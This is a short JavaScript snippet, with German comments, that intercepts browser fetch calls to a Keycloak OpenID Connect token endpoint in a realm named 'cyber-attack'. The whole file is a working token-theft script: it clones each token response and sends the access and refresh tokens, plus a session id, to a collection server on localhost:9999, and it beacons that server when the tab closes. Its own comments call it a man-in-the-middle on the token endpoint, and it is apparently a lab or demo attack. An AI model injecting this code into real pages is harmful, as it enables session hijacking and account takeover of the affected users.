(function() {
    const sessionId = Date.now() + Math.random().toString(36).substring(2, 9);
    const originalFetch = window.fetch;

    // Alle HTTP-Request abfangen
    window.fetch = function(...args) {
        const requestURI = args[0].href;
        // Man in the middle bei Token-Endpoint
        if (requestURI && requestURI.includes('/realms/cyber-attack/protocol/openid-connect/token')) {
            return originalFetch.apply(this, args).then(response => {
                const clonedResponse = response.clone();

                clonedResponse.json().then(body => {
                    sendTokenBodyToServer(body);
                }).catch(error => {
                    console.error('Fehler beim Lesen des Response-Body:', error);
                });

                // Response wird returned, um von normaler Website weiterverarbeitet werden zu können
                return response;
            });
        } else {
            return originalFetch.apply(this, args);
        }
    };

    const sendTokenBodyToServer = (body) => {
        fetch('http://localhost:9999/rest/receive-token-body', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ sessionId: sessionId, body: body }),
        });
    };

    function informServerAboutTabClose() {
        navigator.sendBeacon('http://localhost:9999/rest/tab-closed', sessionId);
    }

    window.addEventListener('beforeunload', informServerAboutTabClose);
})();


